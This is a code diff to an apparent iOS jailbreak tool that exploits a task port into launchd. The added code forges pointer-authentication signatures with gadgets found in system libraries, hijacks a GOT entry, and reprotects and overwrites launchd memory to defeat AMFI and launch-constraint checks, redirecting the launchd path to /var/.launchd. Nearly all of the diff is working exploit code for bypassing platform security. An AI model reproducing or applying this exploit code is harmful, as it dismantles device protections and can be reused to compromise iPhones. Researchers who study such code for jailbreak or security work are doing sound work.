@@ -17,6 +17,7 @@
 #include <mach-o/dyld_images.h>
 #include <roothide.h>
 #include "unarchive.h"
+#include "dobby.h"
 
 
 #define NEW_AMFI_STRING "AAAA\x00"
@@ -214,9 +215,100 @@ NSDictionary *getLaunchdStringOffsets(void) {
     return dict;
 }
 
+uint64_t getLaunchdSymbolOffset(const char* symbol) {
+    char *path = "/sbin/launchd";
+    int fd = open(path, O_RDONLY);
+    assert(fd >= 0);
+    
+    struct stat s;
+    assert(fstat(fd, &s) == 0);
+    
+    void *map = mmap(NULL, s.st_size, PROT_READ, MAP_SHARED, fd, 0);
+    assert(map != MAP_FAILED);
+    
+    uint64_t result = 0;
+    
+    struct mach_header_64 *header = (struct mach_header_64*)map;
+    
+    struct segment_command_64 *cur_seg_cmd;
+    struct segment_command_64 *linkedit_segment = NULL;
+    struct symtab_command* symtab_cmd = NULL;
+    struct dysymtab_command* dysymtab_cmd = NULL;
+
+    uintptr_t cur = (uintptr_t)header + sizeof(struct mach_header_64);
+    for (uint i = 0; i < header->ncmds; i++, cur += cur_seg_cmd->cmdsize) {
+      cur_seg_cmd = (struct segment_command_64 *)cur;
+      if (cur_seg_cmd->cmd == LC_SEGMENT_64) {
+        if (strcmp(cur_seg_cmd->segname, SEG_LINKEDIT) == 0) {
+          linkedit_segment = cur_seg_cmd;
+        }
+      } else if (cur_seg_cmd->cmd == LC_SYMTAB) {
+        symtab_cmd = (struct symtab_command*)cur_seg_cmd;
+      } else if (cur_seg_cmd->cmd == LC_DYSYMTAB) {
+        dysymtab_cmd = (struct dysymtab_command*)cur_seg_cmd;
+      }
+    }
+
+    if (!symtab_cmd || !dysymtab_cmd || !linkedit_segment || !dysymtab_cmd->nindirectsyms) {
+        return 0;
+    }
+
+    // Find base symbol/string table addresses
+    struct nlist_64 *symtab = (struct nlist_64 *)((uintptr_t)header + symtab_cmd->symoff);
+    char *strtab = (char *)((uintptr_t)header + symtab_cmd->stroff);
+
+    // Get indirect symbol table (array of uint32_t indices into symbol table)
+    uint32_t *indirect_symtab = (uint32_t *)((uintptr_t)header + dysymtab_cmd->indirectsymoff);
+
+    cur = (uintptr_t)header + sizeof(struct mach_header_64);
+    for (uint i = 0; i < header->ncmds; i++, cur += cur_seg_cmd->cmdsize) {
+        cur_seg_cmd = (struct segment_command_64 *)cur;
+        if (cur_seg_cmd->cmd != LC_SEGMENT_64) continue;
+        if (strcmp(cur_seg_cmd->segname, "__AUTH_CONST") != 0
+         && strcmp(cur_seg_cmd->segname, "__DATA_CONST") != 0) {
+          continue;
+        }
+
+        for (uint j = 0; j < cur_seg_cmd->nsects; j++) {
+            struct section_64 *sect = (struct section_64 *)(cur + sizeof(struct segment_command_64)) + j;
+            if(strcmp(sect->sectname, header->cpusubtype==0 ? "__got" : "__auth_got") == 0) {
+                uint32_t *indirect_symbol_indices = indirect_symtab + sect->reserved1;
+                void **indirect_symbol_bindings = (void **)((uintptr_t)header + sect->offset);
+                
+                for (uint k = 0; k < sect->size / sizeof(void *); k++)
+                {
+                    uint32_t symtab_index = indirect_symbol_indices[k];
+                    if (symtab_index == INDIRECT_SYMBOL_ABS || symtab_index == INDIRECT_SYMBOL_LOCAL ||
+                        symtab_index == (INDIRECT_SYMBOL_LOCAL   | INDIRECT_SYMBOL_ABS)) {
+                        continue;
+                    }
+                    
+                    uint32_t strtab_offset = symtab[symtab_index].n_un.n_strx;
+                    char *symbol_name = strtab + strtab_offset;
+                    if(strcmp(symbol_name, symbol) == 0)
+                    {
+                        printf("found sym[%d] %s \n", k, symbol_name);
+                        result = (uint64_t)&(indirect_symbol_bindings[k]) - (uint64_t)header;
+                        break;
+                    }
+                }
+            }
+
+            if(result) break;
+        }
+
+        if(result) break;
+    }
+    
+    munmap((void *)map, s.st_size);
+    close(fd);
+    
+    return result;
+}
+
 uint64_t getDyldPACIAOffset(uint64_t _dyld_start) {
     void *handle = dlopen("/usr/lib/dyld", RTLD_GLOBAL);
-    uint32_t *func = (uint32_t *)dlsym(RTLD_DEFAULT, "_dyld_start");
+    uint32_t *func = (uint32_t *)xpaci((uint64_t)dlsym(RTLD_DEFAULT, "_dyld_start"));
     uint32_t *dyld_start_func = func;
 
     // 1. find where `B start`
@@ -276,7 +368,7 @@ if(IS_ARM64E_DEVICE()) {
     // unauthenticated br x8 gadget
     void *handle = dlopen("/usr/lib/swift/libswiftDistributed.dylib", RTLD_GLOBAL);
     assert(handle != NULL);
-    uint32_t *func = (uint32_t *)dlsym(RTLD_DEFAULT, "swift_distributed_execute_target");
+    uint32_t *func = (uint32_t *)xpaci((uint64_t)dlsym(RTLD_DEFAULT, "swift_distributed_execute_target"));
     assert(func != NULL);
     for (; *func != 0xd61f0100; func++) {}
     brX8Address = (uint64_t)func;
@@ -290,13 +382,13 @@ if(IS_ARM64E_DEVICE()) {
     }
 
     // PAC signing gadget
-    func = (uint32_t *)zeroify_scalable_zone;
+    func = (uint32_t *)xpaci((uint64_t)zeroify_scalable_zone);
     for (; func[0] != 0xdac10230 || func[1] != 0xf9000110; func++) {}
     paciaAddress = (uint64_t)func;
     printf("Found pacia x16, x17 at address: 0x%016lx\n", paciaAddress);
     
     // change LR gadget
-    func = (uint32_t *)dispatch_debug;
+    func = (uint32_t *)xpaci((uint64_t)dispatch_debug);
     for (; func[0] != 0xaa0103fe || func[1] != 0xf9402008; func++) {}
     changeLRAddress = (uint64_t)func;
 
@@ -477,6 +569,17 @@ if(IS_ARM64E_DEVICE()) {
     printf("Resume4: PC: 0x%llx\n", self.dtProc.newState->__pc); //(pacia x16, x8)+4 on dyld`main
     brX8Address = self.dtProc.newState->__x[16];
     printf("Signed brX8Address: 0x%lx\n", brX8Address);
+
+
+    // sign pacia gadget
+    self.dtProc.newState->__x[16] = paciaAddress;
+    self.dtProc.newState->__pc = signedPaciaPtr;
+    self.dtProc.newState->__flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC;
+    [self.dtProc resume];
+    printf("Resume4.1: PC: 0x%llx\n", self.dtProc.newState->__pc); //(pacia x16, x8)+4 on dyld`main
+    paciaAddress = self.dtProc.newState->__x[16];
+    printf("Signed paciaAddress: 0x%lx\n", paciaAddress);
+
     
     // Clear hardware breakpoint
     [self.ubProc write64:(uint64_t)&debug_state->__bvr[0] value:0];
@@ -595,7 +698,7 @@ if(IS_ARM64E_DEVICE()) {
             abort();
         }
         
-        if (*(uint32_t *)getpagesize == 0xd503237f) {
+        if (IS_ARM64E_DEVICE()) {
             // we know this is arm64e hardware if some function starts with pacibsp
             printf("Performing PAC bypass...\n");
             [self performBypassPAC];
@@ -712,23 +815,21 @@ if(IS_ARM64E_DEVICE()) {
         // minimum page = 0x5f000;
         vm_offset_t launchd_str_off = NSUserDefaults.standardUserDefaults.offsetLaunchdPath;
         vm_offset_t amfi_str_off = NSUserDefaults.standardUserDefaults.offsetAMFI;
-
-        assert(launchd_str_off != 0);
         
-        printf("reprotecting 0x%lx\n", (launchd_base + launchd_str_off & ~PAGE_MASK));
-        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_protect, launchd_task, launchd_base + launchd_str_off & ~PAGE_MASK, 0x8000, false, VM_PROT_READ|VM_PROT_WRITE);
-        if(kr == KERN_PROTECTION_FAILURE) 
-        {
-            kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_protect, launchd_task, launchd_base + launchd_str_off & ~PAGE_MASK, 0x8000, false, VM_PROT_READ|VM_PROT_WRITE|VM_PROT_COPY);
-            if (kr != KERN_SUCCESS) {
-                printf("vm_protect failed: kr = %s\n", mach_error_string(kr));
-                abort();
-            }
-        }
         
 if(@available(iOS 17.0, *)) {
 
         assert(amfi_str_off != 0);
+
+        printf("reprotecting amfi_str: 0x%lx\n", (launchd_base + amfi_str_off) & ~PAGE_MASK);
+        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_protect, launchd_task, (launchd_base + amfi_str_off) & ~PAGE_MASK, PAGE_SIZE, false, VM_PROT_READ|VM_PROT_WRITE);
+        if(kr == KERN_PROTECTION_FAILURE) {
+            kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_protect, launchd_task, (launchd_base + amfi_str_off) & ~PAGE_MASK, PAGE_SIZE, false, VM_PROT_READ|VM_PROT_WRITE|VM_PROT_COPY);
+            if (kr != KERN_SUCCESS) {
+                fprintf(stderr, "vm_protect amfi_str failed: kr = %s\n", mach_error_string(kr));
+                abort();
+            }
+        }
 
         // https://github.com/wh1te4ever/TaskPortHaxxApp/commit/327022fe73089f366dcf1d0d75012e6288916b29
         // Bypass panic by launch constraints
@@ -739,20 +840,157 @@ if(@available(iOS 17.0, *)) {
         [self.dtProc writeString:map string:NEW_AMFI_STRING];
         kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_write, launchd_task, launchd_base + amfi_str_off, map, 5);
         if (kr != KERN_SUCCESS) {
-            printf("vm_write failed\n");
+            fprintf(stderr, "vm_write amfi_str failed: kr = %s\n", mach_error_string(kr));
             abort();
         }
         [self.dtProc taskHexDump:launchd_base + amfi_str_off size:0x100 task:(mach_port_t)launchd_task map:(uint64_t)map];
 }
 
+
+#define _COMM_PAGE_START_ADDRESS (0x0000000FFFFFC000ULL)
+#define _COMM_PAGE_TPRO_WRITE_ENABLE (_COMM_PAGE_START_ADDRESS + 0x0D0)
+#define _COMM_PAGE_TPRO_WRITE_DISABLE (_COMM_PAGE_START_ADDRESS + 0x0D8)
+printf("tpro_write_enable=%llx tpro_write_disable=%llx\n", *(uint64_t*)_COMM_PAGE_TPRO_WRITE_ENABLE, *(uint64_t*)_COMM_PAGE_TPRO_WRITE_DISABLE);
+
+vm_address_t launchd_path_addr = 0;
+
+if(launchd_str_off != 0)
+{
+	launchd_path_addr = launchd_base + launchd_str_off;
+}
+else
+{
+//*
+    /* NOTE: 
+        1: on 17.0+ __auth_got is also protected by TPRO, so this is only for 16.x
+        2: apple uses different PAC keys between platform processes and 3rd procesess, so this doesn't work on re-signed launchd
+    */
+
+    uint64_t launchd__NSGetExecutablePath_symbol_offset = getLaunchdSymbolOffset("__NSGetExecutablePath");
+    assert(launchd__NSGetExecutablePath_symbol_offset != 0);
+
+    vm_address_t launchd__NSGetExecutablePath_symbol_addr = launchd_base + launchd__NSGetExecutablePath_symbol_offset;
+    assert(RemoteArbCall(self.dtProc, vm_read_overwrite, launchd_task, launchd__NSGetExecutablePath_symbol_addr, 8, map, map + 8) == KERN_SUCCESS);
+    uint64_t launchd__NSGetExecutablePath_symbol_ptr = RemoteRead64(map);
+    printf("self _NSGetExecutablePath_symbol_ptr: 0x%llx\n", xpaci((uint64_t)_NSGetExecutablePath));
+    printf("launchd _NSGetExecutablePath_symbol_ptr: 0x%llx/0x%llx\n", launchd__NSGetExecutablePath_symbol_ptr, xpaci(launchd__NSGetExecutablePath_symbol_ptr));
+    #ifdef __arm64e__
+    printf("test-sign launchd__NSGetExecutablePath_symbol_ptr: %p\n", ptrauth_sign_unauthenticated((void*)xpaci(launchd__NSGetExecutablePath_symbol_ptr), ptrauth_key_asia, launchd__NSGetExecutablePath_symbol_addr));
+    #endif
+
+    uint64_t launchd_getlogin_r_ptr = xpaci((uint64_t)getlogin_r);
+
+    if(IS_ARM64E_DEVICE())
+    {
+        //*
+        self.dtProc.newState->__x[8] = 0; //trap
+        self.dtProc.newState->__x[16] = xpaci(launchd__NSGetExecutablePath_symbol_ptr);
+        self.dtProc.newState->__x[17] = launchd__NSGetExecutablePath_symbol_addr;
+        self.dtProc.newState->__pc = paciaAddress;
+        self.dtProc.newState->__flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC;
+        self.dtProc.expectedLR = -1;
+        [self.dtProc resume];
+
+        printf("re-signed launchd__NSGetExecutablePath_symbol_ptr: 0x%llx\n", self.dtProc.newState->__x[16]);
+        assert(self.dtProc.newState->__x[16] == launchd__NSGetExecutablePath_symbol_ptr);
+        //*/
+
+        self.dtProc.newState->__x[8] = 0; //trap
+        self.dtProc.newState->__x[16] = launchd_getlogin_r_ptr;
+        self.dtProc.newState->__x[17] = launchd__NSGetExecutablePath_symbol_addr;
+        self.dtProc.newState->__pc = paciaAddress;
+        self.dtProc.newState->__flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC;
+        self.dtProc.expectedLR = -1;
+        [self.dtProc resume];
+
+        launchd_getlogin_r_ptr = self.dtProc.newState->__x[16];
+        printf("signed launchd_getlogin_r_ptr: 0x%llx\n", launchd_getlogin_r_ptr);
+    }
+
+    kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_protect, launchd_task, launchd__NSGetExecutablePath_symbol_addr & ~PAGE_MASK, PAGE_SIZE, false, VM_PROT_READ|VM_PROT_WRITE);
+    if(kr == KERN_PROTECTION_FAILURE)  {
+        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_protect, launchd_task, launchd__NSGetExecutablePath_symbol_addr & ~PAGE_MASK, PAGE_SIZE, false, VM_PROT_READ|VM_PROT_WRITE|VM_PROT_COPY);
+        if (kr != KERN_SUCCESS) {
+            fprintf(stderr, "vm_protect launchd__NSGetExecutablePath_symbol failed: kr = %s\n", mach_error_string(kr));
+            abort();
+        }
+    }
+
+    [self.dtProc write64:map value:launchd_getlogin_r_ptr];
+    assert(RemoteArbCall(self.dtProc, vm_write, launchd_task, launchd__NSGetExecutablePath_symbol_addr, map, 8) == KERN_SUCCESS);
+
+    uint64_t __logname_addr = (uint64_t)DobbySymbolResolver("/usr/lib/system/libsystem_c.dylib", "__logname");
+    printf("__logname_addr: 0x%llx\n", __logname_addr);
+    assert(__logname_addr != 0);
+
+    assert(RemoteArbCall(self.dtProc, vm_read_overwrite, launchd_task, __logname_addr, 8, map, map + 8) == KERN_SUCCESS);
+    uint64_t launchd__logname_ptr = RemoteRead64(map);
+    printf("launchd__logname_ptr: 0x%llx\n", launchd__logname_ptr);
+
+    assert(RemoteArbCall(self.dtProc, vm_allocate, launchd_task, map, PAGE_SIZE, VM_FLAGS_ANYWHERE) == KERN_SUCCESS);
+    uint64_t launchd__logname_new = RemoteRead64(map);
+    printf("launchd__logname_new:  0x%llx\n", launchd__logname_new);
+    
+    assert(RemoteArbCall(self.dtProc, vm_write, launchd_task, __logname_addr, map, 8) == KERN_SUCCESS);
+
+    launchd_path_addr = launchd__logname_new;
+	
+/*/
+
+	ASSERT(*(uint64_t*)_COMM_PAGE_TPRO_WRITE_ENABLE == 0);
+
+	uint64_t gDyldPtr = (uint64_t)DobbySymbolResolver("/usr/lib/system/libdyld.dylib", "__ZN5dyld45gDyldE");
+	printf("gDyld ptr: 0x%llx\n", gDyldPtr);
+	assert(gDyldPtr != 0);
+
+	assert(RemoteArbCall(self.dtProc, vm_read_overwrite, launchd_task, gDyldPtr, 8, map, map + 8) == KERN_SUCCESS);
+	uint64_t gDyld = RemoteRead64(map);
+	printf("gDyld: 0x%llx\n", gDyld);
+	assert(gDyld != 0);
+
+	assert(RemoteArbCall(self.dtProc, vm_read_overwrite, launchd_task, gDyld + 8, 8, map, map + 8) == KERN_SUCCESS);
+	uint64_t config = RemoteRead64(map);
+	printf("config: 0x%llx\n", config);
+	assert(config != 0);
+	
+	// mainExecutablePath is at 0x10 for iOS 15~18.3.2, 0x20 for iOS 18.4+
+	assert(RemoteArbCall(self.dtProc, vm_read_overwrite, launchd_task, config + 0x10, 8, map, map + 8) == KERN_SUCCESS);
+	uint64_t mainExecutablePath = RemoteRead64(map);
+	printf("mainExecutablePath: 0x%llx\n", mainExecutablePath);
+	assert(mainExecutablePath != 0);
+
+	assert(RemoteArbCall(self.dtProc, vm_read_overwrite, launchd_task, mainExecutablePath, sizeof("/sbin/launchd"), map, map + 0x100) == KERN_SUCCESS);
+
+	char buffer[255]={0};
+	*(uint64_t*)&buffer[0] = RemoteRead64(map + 0);
+	*(uint64_t*)&buffer[8] = RemoteRead64(map + 8);
+	printf("launchd path string: %s\n", buffer);
+
+	assert(strcmp(buffer, "/sbin/launchd")==0);
+
+	launchd_path_addr = mainExecutablePath;
+//*/
+}
+
+        printf("reprotecting launchd_str: 0x%lx\n", (launchd_path_addr & ~PAGE_MASK));
+        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_protect, launchd_task, launchd_path_addr & ~PAGE_MASK, PAGE_SIZE, false, VM_PROT_READ|VM_PROT_WRITE);
+        if(kr == KERN_PROTECTION_FAILURE) {
+            kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_protect, launchd_task, launchd_path_addr & ~PAGE_MASK, PAGE_SIZE, false, VM_PROT_READ|VM_PROT_WRITE|VM_PROT_COPY);
+            if (kr != KERN_SUCCESS) {
+                fprintf(stderr, "vm_protect launchd_str failed: kr = %s\n", mach_error_string(kr));
+                abort();
+            }
+        }
+
         // Overwrite /sbin/launchd string to /var/.launchd
         const char *newPath = NEW_LAUNCHD_PATH;
         [self.dtProc writeString:map string:newPath];
-        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_write, launchd_task, launchd_base + launchd_str_off, map, strlen(newPath));
+        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_write, launchd_task, launchd_path_addr, map, strlen(newPath));
         if (kr != KERN_SUCCESS) {
-            printf("vm_write failed\n");
+            fprintf(stderr, "vm_write launchd_str failed: kr = %s\n", mach_error_string(kr));
             abort();
         }
+
         printf("Successfully overwrote launchd executable path string to %s\n", newPath);
 
         //RemoteArbCall(self.dtProc, exit, 0);
